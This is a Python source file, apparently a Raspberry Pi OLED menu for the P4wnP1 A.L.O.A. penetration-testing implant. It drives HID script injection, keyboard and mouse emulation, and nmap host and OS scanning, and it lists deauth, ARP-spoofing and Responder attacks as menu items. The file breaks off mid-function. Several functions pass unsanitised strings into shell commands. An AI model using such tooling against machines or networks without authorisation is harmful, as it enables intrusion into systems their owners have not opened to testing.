#!/usr/bin/env python3

import datetime
import os
import time
import subprocess
from subprocess import Popen
import RPi.GPIO as GPIO
import smbus2 as smbus
from luma.core.render import canvas
from PIL import ImageFont
from library import display, ups, system, ui

UPS = 0  # 1 = UPS Lite connected / 0 = No UPS Lite hat

# this is related to the ups bus not the screen
bus = smbus.SMBus(1)  # 0 = /dev/i2c-0 (port I2C0), 1 = /dev/i2c-1 (port I2C1)

GPIO.setwarnings(False)
# P4wnP1 essential const
hidpath = "/usr/local/P4wnP1/HIDScripts/"
sshpath = "/usr/local/P4wnP1/scripts/"

# Load default font.
font = ImageFont.load("fonts/Tamsyn6x12r.pil")

SCNTYPE = 1  # 1= OLED #2 = TERMINAL MODE BETA TESTS VERSION

# GPIO define and OLED configuration
RST_PIN = 25  # waveshare settings
CS_PIN = 8  # waveshare settings
DC_PIN = 24  # waveshare settings
KEY_UP_PIN = 6  # stick up
KEY_DOWN_PIN = 19  # stick down
KEY_LEFT_PIN = 5  # 5  #sitck left // go back
KEY_RIGHT_PIN = 26  # stick right // go in // validate
KEY_PRESS_PIN = 13  # stick center button
KEY1_PIN = 21  # key 1 // up
KEY2_PIN = 20  # 20 #key 2 // cancel/goback
KEY3_PIN = 16  # key 3 // down
USER_I2C = 0  # set to 1 if your oled is I2C or  0 if use SPI interface

# todo: replace with tmuxRun

def autoKillCommand(tx1, t):
    #tx2 = "timeout " + str(t) + "s" + tx1
    cmd = (
        "touch touchedcommand.sh && echo '#!/bin/bash\n"
        + tx1
        + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
    )
    result = system.execCmd(cmd)
    Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
    # display.text("","","Executed","","","","")
    time.sleep(t)
    # print(cmd)
    # subprocess.call(["timeout 2s",str(cmd)])
    ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
    cmd = "rm -f nohup.out && rm -f touchedcommand.sh"
    result = system.execCmd(cmd)
    if result == -1:
        display.error()
        return -1
    error = 0
    while error == 0:
        cmd = "ps -aux | grep '" + tx1 + "' | head -n 1 | cut -d ' ' -f7"
        result = system.execCmd(cmd)
        cmd = "kill " + (str(result).split("'")[1])[:-2]
        # print(cmd)
        result = system.execCmd(cmd)
        if result == -1:
            error = 1
    return True


def killCommand(cmd):
    error = 0
    while error == 0:
        cmd = "ps -aux | grep '" + cmd + "' | head -n 1 | cut -d ' ' -f7"
        result = system.execCmd(cmd)
        cmd = "kill " + (str(result).split("'")[1])[:-2]
        # print(cmd)
        result = system.execCmd(cmd)
        if result == -1:
            error = 1
    error = 0
    while error == 0:
        cmd = "ps -aux | grep '" + cmd + "' | head -n 1 | cut -d ' ' -f8"
        result = system.execCmd(cmd)
        cmd = "kill " + (str(result).split("'")[1])[:-2]
        result = system.execCmd(cmd)
        if result == -1:
            error = 1
    return ()


def autoKillCommandNoKill(tx1, t):
    cmd = (
        "touch touchedcommand.sh && echo '#!/bin/bash\n"
        + tx1
        + " &' > touchedcommand.sh && chmod +x touchedcommand.sh"
    )
    result = system.execCmd(cmd)
    Popen(["nohup", "/bin/bash", "touchedcommand.sh"], preexec_fn=os.setpgrp)
    cmd = "rm -f nohup.out && rm -f touchedcommand.sh"
    result = system.execCmd(cmd)
    if result == -1:
        return -1
    return 1


def waitingLoop(msg):
    uscire = 0
    while uscire == 0:
        if not GPIO.input(KEY_RIGHT_PIN): # button is pressed:
            uscire = 1
        display.msg("msg", 0.2)


def checklist(_list):
    listattack = _list
    maximum = len(listattack)  # number of records
    cur = 0
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 0
        if maximum < 7:
            for n in range(0, 7):
                if n < maximum:
                    if n == cur:
                        item[n] = ">" + listattack[n]
                    else:
                        item[n] = " " + listattack[n]
                else:
                    item[n] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
        if not GPIO.input(KEY_UP_PIN):
            cur = cur - 1
            if cur < 0:
                cur = 0
        if not GPIO.input(KEY_DOWN_PIN):
            cur = cur + 1
            if cur > maximum - 1:
                cur = maximum - 1
        if not GPIO.input(KEY_LEFT_PIN):  # button is released
            return ()
        if not GPIO.input(KEY_RIGHT_PIN):
            lastmenu = listattack[cur]
            # print(lastmenu)
            return lastmenu
        # print(str(cur) + " " + listattack[cur])        #debug
        display.text(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)
    return ""

def shell(cmd):
    return subprocess.check_output(cmd, shell=True)

def switchMenu(argument):
    switcher = {
        # main menu
        #  |                     |<-- this character isn't visible
        0: "_      DELIBOY       |",
        1: "_SYSTEM SETTINGS",
        2: "_HID ATTACKS",
        3: "_WIRELESS ATTACKS",
        4: "_TRIGGERS",
        5: "_TEMPLATES",
        6: "_NETWORK ATTACKS",
        # SYSTEM SETTINGS
        7: "_System Information",
        8: "_OLED Brightness",
        9: "_HOST OS Detection",
        10: "_Display Off",
        11: "_Key Test",
        12: "_Reboot GUI",
        13: "_Reboot System",
        # HID Attacks
        14: "_Run HIDScript",
        15: "_Key Gamepad",
        16: "_Emulate Mouse",
        17: "_Set Typing Speed",
        18: "_Set Key Layout",
        19: "_",
        20: "_",
        # Wireless Attacks
        21: "_Scan WIFI AP",
        22: "_Hosts Discovery",
        23: "_Nmap",
        24: "_Vulnerability Scan",
        25: "_Deauther-Bcast",
        26: "_Deauther-Client",
        27: "_",
        # triggers
        28: "_Send to oled group",
        29: "_",
        30: "_",
        31: "_",
        32: "_",
        33: "_",
        34: "_",
        # templates
        35: "_FULL SETTINGS",
        36: "_BLUETOOTH",
        37: "_USB",
        38: "_WIFI",
        39: "_TRIGGER ACTIONS",
        40: "_NETWORK",
        41: "_",
        # network attacks
        42: "_(Broken)ArpSpoofing",
        43: "_Responder",
        44: "_",
        45: "_",
        46: "_",
        47: "_",
        48: "_",
        # main menu page 2
        49: "_USBETH ATTACKS",
        50: "_TEST MENU",
        51: "_newsubmenu3",
        52: "_newsubmenu4",
        53: "_newsubmenu5",
        54: "_newsubmenu6",
        55: "_UPDATE OLED MENU",
        # usbeth attacks
        56: "_Nmap USB Device (x.2)",
        57: "_",
        58: "_",
        59: "_",
        60: "_",
        61: "_",
        62: "_",
        # tests
        63: "_Test (+7)",
        64: "_Test (<7)",
        65: "_Select Network Interface",
        66: "_New Home Menu",
        67: "_",
        68: "_",
        69: "_",
        #
        70: "_",
        71: "_",
        72: "_",
        73: "_",
        74: "_",
        75: "_",
        76: "_",
    }
    return switcher.get(argument, "Invalid")


def about():
    # simple sub routine to show an About
    display.text(
        " : P4wnP1 A.L.O.A :",
        "P4wnP1 (c) @Mame82",
        "V 1.0",
        "This GUI is improved by",
        "DELIFER, Fuocoman",
        "Original Code by",
        "BeBoXoS",
    )
    while GPIO.input(KEY_LEFT_PIN):
        # wait
        pass


def identifyOS(ips):
    # return os name if found ex. Microsoft Windows 7 ,  Linux 3.X
    return shell(
        "nmap -p 22,80,445,65123,56123 -O "
        + ips
        + ' | grep Running: | cut -d ":" -f2 | cut -d "|" -f1'
    )


def osDetails(ips):
    return shell(
        "nmap -p 22,80,445,65123,56123 -O "
        + ips
        + ' | grep "OS details:" | cut -d ":" -f2 | cut -d "," -f1'
    )


def keyTest():
    if SCNTYPE == 1:
        while GPIO.input(KEY_LEFT_PIN):
            with canvas(display.device) as draw:
                if GPIO.input(KEY_UP_PIN):  # button is released
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=0
                    )  # Up
                else:  # button is pressed:
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=1
                    )  # Up filled

                if GPIO.input(KEY_LEFT_PIN):  # button is released
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=0
                    )  # left
                else:  # button is pressed:
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=1
                    )  # left filled

                if GPIO.input(KEY_RIGHT_PIN):  # button is released
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=0
                    )  # right
                else:  # button is pressed:
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=1
                    )  # right filled

                if GPIO.input(KEY_DOWN_PIN):  # button is released
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=0
                    )  # down
                else:  # button is pressed:
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=1
                    )  # down filled

                if GPIO.input(KEY_PRESS_PIN):  # button is released
                    draw.rectangle((20, 22, 40, 40), outline=255, fill=0)  # center
                else:  # button is pressed:
                    draw.rectangle(
                        (20, 22, 40, 40), outline=255, fill=1
                    )  # center filled

                if GPIO.input(KEY1_PIN):  # button is released
                    draw.ellipse((70, 0, 90, 20), outline=255, fill=0)  # A button
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 0, 90, 20), outline=255, fill=1
                    )  # A button filled

                if GPIO.input(KEY2_PIN):  # button is released
                    draw.ellipse((100, 20, 120, 40), outline=255, fill=0)  # B button
                else:  # button is pressed:
                    draw.ellipse(
                        (100, 20, 120, 40), outline=255, fill=1
                    )  # B button filled

                if GPIO.input(KEY3_PIN):  # button is released
                    draw.ellipse((70, 40, 90, 60), outline=255, fill=0)  # A button
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 40, 90, 60), outline=255, fill=1
                    )  # A button filled


def templateSelect(list):
    # getTemplateList("BLUETOOTH").split("\n")
    file = getTemplateList(list).split("\n")
    maximum = len(file)
    cur = 1
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 1
        if maximum < 8:
            for n in range(1, 8):
                if n < maximum:
                    if n == cur:
                        item[n - 1] = ">" + file[n]
                    else:
                        item[n - 1] = " " + file[n]
                else:
                    item[n - 1] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok - 1] = ">" + file[n]
                    else:
                        item[tok - 1] = " " + file[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok - 1] = ">" + file[n]
                    else:
                        item[tok - 1] = " " + file[n]
                    tok = tok + 1
        if not GPIO.input(KEY_UP_PIN):
            cur = cur - 1
            if cur < 1:
                cur = 1
        if not GPIO.input(KEY_DOWN_PIN):
            cur = cur + 1
            if cur > maximum - 2:
                cur = maximum - 2
        if not GPIO.input(KEY_RIGHT_PIN):
            lastmenu = file[cur]
            print(lastmenu)
            return lastmenu
        # ----------
        display.text(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)

# todo: rewrite this mess
def runHidScript():
    # choose and run (or not) a script
    file = ui.fileSelect(hidpath, ".js")
    time.sleep(0.5)
    if file == "":
        return ()
    while GPIO.input(KEY_LEFT_PIN):
        answer = 0
        while answer == 0:
            display.text(
                "YES              YES", "", "", file, "", "", "NO                NO"
            )
            if not GPIO.input(KEY_UP_PIN):
                answer = 1
            if not GPIO.input(KEY_DOWN_PIN):
                answer = 2
            if not GPIO.input(KEY1_PIN):
                answer = 1
            if not GPIO.input(KEY3_PIN):
                answer = 2
        if answer == 2:
            return ()
        time.sleep(0.5)  # pause
        answer = 0
        while answer == 0:
            display.text(
                "   Run Background job",
                "",
                "",
                "Method ?       CANCEL",
                "",
                "",
                "       Run direct job",
            )
            if not GPIO.input(KEY_UP_PIN):
                answer = 1
            if not GPIO.input(KEY_LEFT_PIN):
                answer = 2
            if not GPIO.input(KEY_DOWN_PIN):
                answer = 3
            if not GPIO.input(KEY1_PIN):
                answer = 1
            if not GPIO.input(KEY2_PIN):
                answer = 2
            if not GPIO.input(KEY3_PIN):
                answer = 3
        if answer == 2:
            return ()
        display.text("", "", "", "HIDScript running...", "", "", "")
        if answer == 1:
            # run as background job P4wnP1_cli hid job command
            cmd = "P4wnP1_cli hid job '" + file + "'"
            system.execCmd(cmd)
            return ()
        if answer == 3:
            # run hid script directly
            cmd = "P4wnP1_cli hid run '" + file + "'"
            system.execCmd(cmd)
            return ()


def restart():
    display.text("", "", "", "hang on...", "", "", "")
    cmd = "python3 /root/DeliMenu/new.py &"
    system.execCmd(cmd)
    return ()

def reboot():
    display.text("","","","  bye bye!","","","")
    system.execCmd("reboot")
    return ()

def shutdown():
    display.text("","","","  bye bye!","","","")
    system.execCmd("shutdown now")
    return ()


def getTemplateList(type):
    # get list of template
    # Possible types : FULL_SETTINGS , BLUETOOTH , USB , WIFI , TRIGGER_ACTIONS , NETWORK
    cmd = "P4wnP1_cli template list"
    result = system.execCmd(cmd)
    list = result
    list = list.replace("Templates of type ", "")  # remove uwanted text
    list = list.replace(" :", "")
    list = list.replace("------------------------------------\n", "")
    list = list.split("\\n")
    result = ""
    found = 0
    for n in range(0, len(list)):
        if list[n] == type:
            found = 1
        if list[n] == "":
            found = 0
        if found == 1:
            result = result + list[n] + "\n"
    return result


def applyTemplate(template, section):
    print(template)
    print(section)
    while GPIO.input(KEY_LEFT_PIN):
        answer = 0
        while answer == 0:
            display.text(
                "YES              YES", "", "", template, "", "", "NO                NO"
            )
            if not GPIO.input(KEY_UP_PIN):
                answer = 1
            if not GPIO.input(KEY_DOWN_PIN):
                answer = 2
            if not GPIO.input(KEY1_PIN):
                answer = 1
            if not GPIO.input(KEY3_PIN):
                answer = 2
        if answer == 2:
            return ()
        time.sleep(0.5)  # pause
        cmd = "P4wnP1_cli template deploy -" + section + " " + template + ""
        system.execCmd(cmd)
        return ()


def emuGamepad():
    if SCNTYPE == 1:
        while GPIO.input(KEY_PRESS_PIN):
            with canvas(display.device) as draw:
                if GPIO.input(KEY_UP_PIN):  # button is released
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=0
                    )  # Up
                else:  # button is pressed:
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=1
                    )  # Up filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"UP\")'", shell=True
                    )

                if GPIO.input(KEY_LEFT_PIN):  # button is released
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=0
                    )  # left
                else:  # button is pressed:
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=1
                    )  # left filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"LEFT\")'", shell=True
                    )

                if GPIO.input(KEY_RIGHT_PIN):  # button is released
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=0
                    )  # right
                else:  # button is pressed:
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=1
                    )  # right filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"RIGHT\")'", shell=True
                    )

                if GPIO.input(KEY_DOWN_PIN):  # button is released
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=0
                    )  # down
                else:  # button is pressed:
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=1
                    )  # down filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"DOWN\")'", shell=True
                    )

                if GPIO.input(KEY1_PIN):  # button is released
                    draw.ellipse((70, 0, 90, 20), outline=255, fill=0)  # A button
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 0, 90, 20), outline=255, fill=1
                    )  # A button filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"Q\")'", shell=True
                    )

                if GPIO.input(KEY2_PIN):  # button is released
                    draw.ellipse((100, 20, 120, 40), outline=255, fill=0)  # B button
                else:  # button is pressed:
                    draw.ellipse(
                        (100, 20, 120, 40), outline=255, fill=1
                    )  # B button filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"W\")'", shell=True
                    )

                if GPIO.input(KEY3_PIN):  # button is released
                    draw.ellipse((70, 40, 90, 60), outline=255, fill=0)  # A button
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 40, 90, 60), outline=255, fill=1
                    )  # A button filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'press(\"E\")'", shell=True
                    )


def emuMouse():
    button1 = 0
    button2 = 0
    step = 10
    time.sleep(0.5)
    if SCNTYPE == 1:
        while GPIO.input(KEY2_PIN):
            with canvas(display.device) as draw:
                if GPIO.input(KEY_UP_PIN):  # button is released
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=0
                    )  # Up
                else:  # button is pressed:
                    draw.polygon(
                        [(20, 20), (30, 2), (40, 20)], outline=255, fill=1
                    )  # Up filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'moveStepped(0,-" + str(step) + ")'",
                        shell=True,
                    )

                if GPIO.input(KEY_LEFT_PIN):  # button is released
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=0
                    )  # left
                else:  # button is pressed:
                    draw.polygon(
                        [(0, 30), (18, 21), (18, 41)], outline=255, fill=1
                    )  # left filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'moveStepped(-" + str(step) + ",0)'",
                        shell=True,
                    )

                if GPIO.input(KEY_RIGHT_PIN):  # button is released
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=0
                    )  # right
                else:  # button is pressed:
                    draw.polygon(
                        [(60, 30), (42, 21), (42, 41)], outline=255, fill=1
                    )  # right filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'moveStepped(" + str(step) + ",0)'",
                        shell=True,
                    )

                if GPIO.input(KEY_DOWN_PIN):  # button is released
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=0
                    )  # down
                else:  # button is pressed:
                    draw.polygon(
                        [(30, 60), (40, 42), (20, 42)], outline=255, fill=1
                    )  # down filled
                    subprocess.check_output(
                        "P4wnP1_cli hid run -c 'moveStepped(0," + str(step) + ")'",
                        shell=True,
                    )

                if GPIO.input(KEY_PRESS_PIN):  # button is released
                    draw.rectangle((20, 22, 40, 40), outline=255, fill=0)  # center
                else:  # button is pressed:
                    draw.rectangle(
                        (20, 22, 40, 40), outline=255, fill=1
                    )  # center filled
                    if step == 10:
                        # result = subprocess.check_output("P4wnP1_cli hid run -c 'button(BT1)'", shell = True )
                        step = 100
                        time.sleep(0.2)
                    else:
                        # result = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True )
                        step = 10
                        time.sleep(0.2)

                if GPIO.input(KEY1_PIN):  # button is released
                    draw.ellipse((70, 0, 90, 20), outline=255, fill=0)  # A button
                    # result = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True )
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 0, 90, 20), outline=255, fill=1
                    )  # A button filled
                    if button1 == 0:
                        subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BT1)'", shell=True
                        )
                        button1 = 1
                        time.sleep(0.2)
                        subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BTNONE)'", shell=True
                        )

                    else:
                        subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BTNONE)'", shell=True
                        )
                        button1 = 0
                        time.sleep(0.2)
                draw.text((64, display.line4), "Key2 : Exit", font=font, fill=255)
                if GPIO.input(KEY3_PIN):  # button is released
                    draw.ellipse((70, 40, 90, 60), outline=255, fill=0)  # A button
                    # result = subprocess.check_output("P4wnP1_cli hid run -c 'button(BTNONE)'", shell = True )
                else:  # button is pressed:
                    draw.ellipse(
                        (70, 40, 90, 60), outline=255, fill=1
                    )  # A button filled
                    if button2 == 0:
                        subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BT2)'", shell=True
                        )
                        button2 = 1
                        time.sleep(0.2)
                        subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BTNONE)'", shell=True
                        )

                    else:
                        subprocess.check_output(
                            "P4wnP1_cli hid run -c 'button(BTNONE)'", shell=True
                        )
                        button2 = 0
                        time.sleep(0.2)
                # time.sleep(0.1)


def setTypingSpeed():
    time.sleep(0.5)  # pause
    while GPIO.input(KEY_LEFT_PIN):
        display.text(
            " Natural typing speed",
            "",
            "",
            "               CANCEL",
            "",
            "",
            "    Fast typing speed",
        )
        if not GPIO.input(KEY1_PIN):
            subprocess.check_output(
                "P4wnP1_cli hid run -c 'typingSpeed(100,150)'", shell=True
            )
            time.sleep(0.5)  # pause
            return ()
        if not GPIO.input(KEY2_PIN):
            time.sleep(0.5)  # pause
            return ()
        if not GPIO.input(KEY3_PIN):
            subprocess.check_output(
                "P4wnP1_cli hid run -c 'typingSpeed(0,0)'", shell=True
            )
            time.sleep(0.5)  # pause
            return ()
    time.sleep(0.5)  # pause

def scanwifi():
    # list wifi APs
    cmd = "sudo iwlist wlan0 scan | grep ESSID"
    result = system.execCmd(cmd)
    SSID = result.split("'")[1]
    SSID = SSID.replace("                    ESSID:", "")
    SSID = SSID.replace('"', "")
    ssidlist = SSID.split("\\n")
    cmd = "sudo iwlist wlan0 scan | grep Encryption"
    result = system.execCmd(cmd)
    Ekey = result.split("'")[1]
    Ekey = Ekey.replace("                    Encryption ", "")
    Ekeylist = Ekey.split("\\n")
    for n in range(0, len(ssidlist)):
        if ssidlist[n] == "":
            ssidlist[n] = "Hidden"
        ssidlist[n] = ssidlist[n] + " [" + Ekeylist[n] + "]"
    # ----------------------------------------------------------
    listattack = ssidlist
    maximum = len(listattack)  # number of records
    cur = 0
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 0
        if maximum < 7:
            for n in range(0, 7):
                if n < maximum:
                    if n == cur:
                        item[n] = ">" + listattack[n]
                    else:
                        item[n] = " " + listattack[n]
                else:
                    item[n] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok] = ">" + listattack[n]
                    else:
                        item[tok] = " " + listattack[n]
                    tok = tok + 1
        if not GPIO.input(KEY_UP_PIN):
            cur = cur - 1
            if cur < 0:
                cur = 0
        if not GPIO.input(KEY_DOWN_PIN):
            cur = cur + 1
            if cur > maximum - 2:
                cur = maximum - 2
        if not GPIO.input(KEY_RIGHT_PIN):
            lastmenu = listattack[cur]
            display.text(" TOBE IMPLEMENTED (WIFI)", "", "", "", "", "", "")
            time.sleep(2)
            return lastmenu
        # print(str(cur) + " " + listattack[cur])        #debug
        display.text(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)
    return ""


def runTriggers():
    while GPIO.input(KEY_PRESS_PIN):
        with canvas(display.device) as draw:
            if GPIO.input(KEY_UP_PIN):  # button is released
                draw.polygon([(20, 20), (30, 2), (40, 20)], outline=255, fill=0)  # Up
                draw.text((28, display.line2 + 2), "1", font=font, fill=255)
            else:  # button is pressed:
                draw.polygon(
                    [(20, 20), (30, 2), (40, 20)], outline=255, fill=1
                )  # Up filled
                shell('P4wnP1_cli trigger send -n "oled" -v 1')

            if GPIO.input(KEY_LEFT_PIN):  # button is released
                draw.polygon([(0, 30), (18, 21), (18, 41)], outline=255, fill=0)  # left
                draw.text((11, display.line5 - 7), "3", font=font, fill=255)
            else:  # button is pressed:
                draw.polygon(
                    [(0, 30), (18, 21), (18, 41)], outline=255, fill=1
                )  # left filled
                shell('P4wnP1_cli trigger send -n "oled" -v 3')

            if GPIO.input(KEY_RIGHT_PIN):  # button is released
                draw.polygon(
                    [(60, 30), (42, 21), (42, 41)], outline=255, fill=0
                )  # right
                draw.text((45, display.line5 - 7), "4", font=font, fill=255)
            else:  # button is pressed:
                draw.polygon(
                    [(60, 30), (42, 21), (42, 41)], outline=255, fill=1
                )  # right filled
                shell('P4wnP1_cli trigger send -n "oled" -v 4')

            if GPIO.input(KEY_DOWN_PIN):  # button is released
                draw.polygon(
                    [(30, 60), (40, 42), (20, 42)], outline=255, fill=0
                )  # down
                draw.text((28, display.line6 + 3), "2", font=font, fill=255)
            else:  # button is pressed:
                draw.polygon(
                    [(30, 60), (40, 42), (20, 42)], outline=255, fill=1
                )  # down filled
                shell('P4wnP1_cli trigger send -n "oled" -v 2')

            if GPIO.input(KEY1_PIN):  # button is released
                draw.ellipse((70, 0, 90, 20), outline=255, fill=0)  # A button
                draw.text((75, display.line2), "10", font=font, fill=255)
            else:  # button is pressed:
                draw.ellipse((70, 0, 90, 20), outline=255, fill=1)  # A button filled
                shell('P4wnP1_cli trigger send -n "oled" -v 10')

            if GPIO.input(KEY2_PIN):  # button is released
                draw.ellipse((100, 20, 120, 40), outline=255, fill=0)  # B button
                draw.text((105, display.line5 - 7), "20", font=font, fill=255)
            else:  # button is pressed:
                draw.ellipse((100, 20, 120, 40), outline=255, fill=1)  # B button filled
                shell('P4wnP1_cli trigger send -n "oled" -v 20')

            if GPIO.input(KEY3_PIN):  # button is released
                draw.ellipse((70, 40, 90, 60), outline=255, fill=0)  # A button
                draw.text((75, display.line7 - 5), "30", font=font, fill=255)
            else:  # button is pressed:
                draw.ellipse((70, 40, 90, 60), outline=255, fill=1)  # A button filled
                shell('P4wnP1_cli trigger send -n "oled" -v 30')
            draw.text((25, display.line4 + 2), "Go", font=font, fill=255)
            # time.sleep(0.1)


def usbEthOsDetection():
    display.text("", "", "", "      PLEASE WAIT", "", "", "")
    os = identifyOS("172.16.0.2")
    if str(os) == "b''":
        while GPIO.input(KEY_LEFT_PIN):
            display.text(
                "Experimental nmap OS",
                "detection",
                "",
                "Too many fingerprints match this host",
                " Or Zero ",
                "",
                "Press LEFT to exit",
            )
        return

    detail = osDetails("172.16.0.2")

    while GPIO.input(KEY_LEFT_PIN):
        display.text(
            "Experimental nmap OS",
            "detection",
            "",
            os.replace("Microsoft", "MS").replace("Windows", "win"),
            detail.replace("Microsoft", "MS").replace("Windows", "win"),
            "",
            "Press LEFT to exit",
        )

def hostSelect():
    display.text("", "", "", "wait, may take a while ", "", "", "")
    cmd = "hostname -I"
    result = system.execCmd(cmd)
    subnetIp = result.split(" ")[0].split("'")[1]
    pos = subnetIp.rfind(".")
    cmd = (
        "nmap -sL -Pn "
        + str(subnetIp[0:pos])
        + ".0/24 | grep -v 'Nmap scan report for "
        + subnetIp[0:2]
        + "'"
    )
    result = system.execCmd(cmd)
    hosts = result
    hostlist = hosts.split("\\n")
    del hostlist[-1]
    del hostlist[-1]
    del hostlist[0]
    for i in range(0, len(hostlist)):
        hostlist[i] = hostlist[i][21:]
    # print(hostlist[i][21:])
    file = hostlist
    maximum = len(hostlist)
    cur = 1
    lastmenu = ""
    item = ["", "", "", "", "", "", "", ""]
    time.sleep(0.5)
    while GPIO.input(KEY_LEFT_PIN):
        # on boucle
        tok = 1
        if maximum < 8:
            for n in range(1, 8):
                if n < maximum:
                    if n == cur:
                        item[n - 1] = ">" + file[n]
                    else:
                        item[n - 1] = " " + file[n]
                else:
                    item[n - 1] = ""
        else:
            if cur + 7 < maximum:
                for n in range(cur, cur + 7):
                    if n == cur:
                        item[tok - 1] = ">" + file[n]
                    else:
                        item[tok - 1] = " " + file[n]
                    tok = tok + 1
            else:
                for n in range(maximum - 8, maximum - 1):
                    if n == cur:
                        item[tok - 1] = ">" + file[n]
                    else:
                        item[tok - 1] = " " + file[n]
                    tok = tok + 1
        if not GPIO.input(KEY_UP_PIN):
            cur = cur - 1
            if cur < 1:
                cur = 1
        if not GPIO.input(KEY_DOWN_PIN):
            cur = cur + 1
            if cur > maximum - 1:
                cur = maximum - 1
        if not GPIO.input(KEY_RIGHT_PIN):
            lastmenu = file[cur]
            selected = lastmenu.split("(")[1].split(")")[0]
            print(selected)
            # return(lastmenu)
            return selected
        # ----------
        display.text(
            item[0], item[1], item[2], item[3], item[4], item[5], item[6]
        )
        time.sleep(0.1)


def nmap():
    selected = hostSelect()
    choice = 0
    while choice == 0:
        display.text(
            "                  YES",
            "",
            "save the nmap?",
            "this will take a while",
            "/BeboXgui/nmap/<IP>.txt   ",
            "",
            "                   NO",
        )
        if not GPIO.input(KEY1_PIN):  # button is released
            choice = 1  # A button
        if not GPIO.input(KEY3_PIN):  # button is released
            choice = 2
    display.text("", "", "", "    wait ", "", "", "")

    if choice == 1:
        cmd = "nmap -Pn -A -v " + selected + " > nmap/" + selected + ".txt"
        result = system.execCmd(cmd)

        cmd = "cat " + "nmap/" + selected + ".txt |  grep -v Discovered | grep  tcp"
        result = system.execCmd(cmd)
    else:
        cmd = "nmap -Pn -A " + selected + " | grep tcp"
        result = system.execCmd(cmd)

    result = str(result).split("'")[1].split("\\n")[:-1]
    print(result)
    toprint = ["", "", "", "", "", "", ""]
    for i in range(0, len(result)):
        if i >= len(toprint):
            break
        toprint[i] = "_" + result[i]
    display.text(
        toprint[0],
        toprint[1],
        toprint[2],
        toprint[3],
        toprint[4],
        toprint[5],
        toprint[6],
    )
    time.sleep(10)
    # TODO add the vulnerability scan


def nmapLocal():
    selected = "172.16.0.2"
    choice = 0
    while choice == 0:
        display.text(
            "                  YES",
            "",
            "save the nmap?",
            "this will take a while",
            "/BeboXgui/nmap/<IP>.txt   ",
            "",
            "                   NO",
        )
